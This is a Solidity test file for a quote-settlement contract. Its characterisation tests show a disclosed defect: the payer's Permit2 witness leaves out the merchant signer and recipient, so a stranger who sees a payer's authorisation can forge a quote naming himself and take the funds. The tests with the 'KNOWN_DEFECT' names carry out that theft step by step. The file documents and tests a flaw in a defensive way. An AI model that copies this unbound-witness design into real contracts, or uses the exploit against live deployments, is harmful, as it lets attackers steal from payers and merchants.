// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IQuoteSettlement} from "../../src/v2/interfaces/IQuoteSettlement.sol";
import {QuoteSettlementExecutor} from "../../src/v2/QuoteSettlementExecutor.sol";
import {SettlementFixture} from "./util/SettlementFixture.sol";

/// @title What the payer's Permit2 witness actually binds — and what it does not
/// @notice The `Payment` witness covers six fields: `quoteId`, `payer`, `tokenIn`, `maxIn`, the
///         destination, and the executor. The merchant's half of the quote — `merchantSigner`,
///         `recipient`, `tokenOut`, `amountOut`, `pool` — is outside it. Permit2's own digest adds
///         only the token permissions, the spender (this executor, identical for every caller),
///         the nonce and the deadline.
///
///         So two quotes that differ ONLY in `merchantSigner` and `recipient` produce a
///         byte-identical payer signing digest, and one payer signature fits both. Nothing else in
///         the path closes it: `merchantSigner` is checked only against the signature over the same
///         quote, there is no merchant registry, and the hook's `consumed` map is keyed on the
///         QUOTE digest — which moves, so the replay guard does not fire either.
///
///         `test_KNOWN_DEFECT_APayerAuthorisationFundsAnyMerchantsQuote` below is a CHARACTERISATION
///         test: it asserts what the frozen `v2.0.0-rc1` core does today, not what it should do.
///         It is written this way on purpose. The defect is in a frozen file, the fix moves the
///         payer's EIP-712 signing digest and therefore every pinned vector and the mined hook
///         address with it, and that is an rc2 decision. Until then the exploit stays executable
///         and named rather than described in prose.
///
///         **When the fix lands, this row MUST break.** Invert it to require a revert and rename it.
///         See `docs/v2/SECURITY-ADVISORY-001.md`.
contract WitnessBindingTest is SettlementFixture {
    uint256 internal constant AMOUNT_OUT = 1e9;
    uint256 internal constant MAX_IN = 10 ether;

    uint256 internal thiefKey = 0xBAD;
    address internal thief;

    function setUp() public {
        _setUpSettlement();
        thief = vm.addr(thiefKey);
    }

    // ---- what the witness does bind ----------------------------------------------------------------

    /// @dev The control for the two rows below it: the field the existing suite varies DOES move the
    ///      witness. Without this row, "the witness did not move" would be evidence of nothing —
    ///      a witness that never moved for any field would satisfy the same assertion.
    function test_Control_TheQuoteIdMovesTheWitness() public view {
        IQuoteSettlement.Quote memory a = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        IQuoteSettlement.Quote memory b = _quote(bytes32("invoice-43"), AMOUNT_OUT, MAX_IN);
        assertTrue(_witness(a) != _witness(b), "quoteId is inside the witness");
    }

    /// @dev And so does every other field the witness names, one at a time.
    function test_Control_EveryWitnessedFieldMovesTheWitness() public view {
        IQuoteSettlement.Quote memory base = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        bytes32 w = _witness(base);

        IQuoteSettlement.Quote memory otherPayer = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        otherPayer.payer = thief;
        assertTrue(_witness(otherPayer) != w, "payer is inside the witness");

        IQuoteSettlement.Quote memory otherCeiling = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN + 1);
        assertTrue(_witness(otherCeiling) != w, "maxIn is inside the witness");

        IQuoteSettlement.Quote memory otherTokenIn = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        otherTokenIn.tokenIn = address(0xBEEF);
        assertTrue(_witness(otherTokenIn) != w, "tokenIn is inside the witness");
    }

    // ---- what it does not bind ---------------------------------------------------------------------

    /// @dev The whole merchant half moves the QUOTE digest and leaves the PAYER digest untouched.
    ///      Both halves of that sentence are asserted, because either alone would be misread:
    ///      identical witnesses with identical quote digests would just be the same quote.
    function test_TheMerchantHalfIsOutsideThePayerWitness() public view {
        IQuoteSettlement.Quote memory honest = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);

        IQuoteSettlement.Quote memory forged = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        forged.merchantSigner = thief;
        forged.recipient = thief;

        assertTrue(_quoteDigest(forged) != _quoteDigest(honest), "the merchant digest must move");
        assertEq(_witness(forged), _witness(honest), "the payer witness does not move");
    }

    /// @dev CHARACTERISATION — asserts the defect, not the desired behaviour. See the contract
    ///      NatSpec. The payer signs one authorisation for the merchant's quote; a stranger who
    ///      sees that authorisation (a relayer holding it, or anyone watching `settle` in the
    ///      mempool) rebuilds the quote naming themselves as both signer and recipient, signs it
    ///      with their own key, and presents the payer's authorisation UNCHANGED.
    function test_KNOWN_DEFECT_APayerAuthorisationFundsAnyMerchantsQuote() public {
        IQuoteSettlement.Quote memory honest = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        QuoteSettlementExecutor.PayerAuthorization memory auth =
            _authorize(honest, 77, block.timestamp + 1 hours, payerKey);

        IQuoteSettlement.Quote memory forged = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        forged.merchantSigner = thief;
        forged.recipient = thief;

        uint256 payerBefore = tokenIn.balanceOf(payer);

        vm.prank(relayer);
        (uint256 actualIn, uint256 deliveredOut) = executor.settle(forged, _signQuoteAs(forged, thiefKey), auth);

        // The settlement closed, and it closed in the thief's favour.
        assertEq(deliveredOut, AMOUNT_OUT, "the thief was delivered the merchant's output");
        assertEq(tokenOut.balanceOf(thief), AMOUNT_OUT, "the thief holds it");
        assertEq(tokenOut.balanceOf(recipient), 0, "the merchant received nothing");
        assertEq(payerBefore - tokenIn.balanceOf(payer), actualIn, "the payer paid in full");
        assertGt(actualIn, 0, "the payer's authorisation was spent");
    }

    /// @dev And the honest settlement can no longer happen: the nonce the payer authorised is spent.
    ///      This is what makes the defect a theft rather than a duplicate payment.
    function test_KNOWN_DEFECT_TheHonestSettlementCannotFollow() public {
        IQuoteSettlement.Quote memory honest = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        QuoteSettlementExecutor.PayerAuthorization memory auth =
            _authorize(honest, 78, block.timestamp + 1 hours, payerKey);

        IQuoteSettlement.Quote memory forged = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        forged.merchantSigner = thief;
        forged.recipient = thief;

        vm.prank(relayer);
        executor.settle(forged, _signQuoteAs(forged, thiefKey), auth);

        vm.prank(relayer);
        vm.expectRevert();
        executor.settle(honest, _signQuoteAs(honest, merchantKey), auth);

        assertEq(tokenOut.balanceOf(recipient), 0, "the merchant is still unpaid");
    }

    /// @dev The control every characterisation row needs: the same fixture settles honestly. A row
    ///      that fails would make the two rows above evidence about the harness, not the contract.
    function test_Control_AnHonestSettlementStillSucceeds() public {
        IQuoteSettlement.Quote memory honest = _quote(bytes32("invoice-42"), AMOUNT_OUT, MAX_IN);
        QuoteSettlementExecutor.PayerAuthorization memory auth =
            _authorize(honest, 79, block.timestamp + 1 hours, payerKey);

        vm.prank(relayer);
        executor.settle(honest, _signQuoteAs(honest, merchantKey), auth);

        assertEq(tokenOut.balanceOf(recipient), AMOUNT_OUT, "the merchant was paid");
        assertEq(tokenOut.balanceOf(thief), 0, "and nobody else was");
    }
}
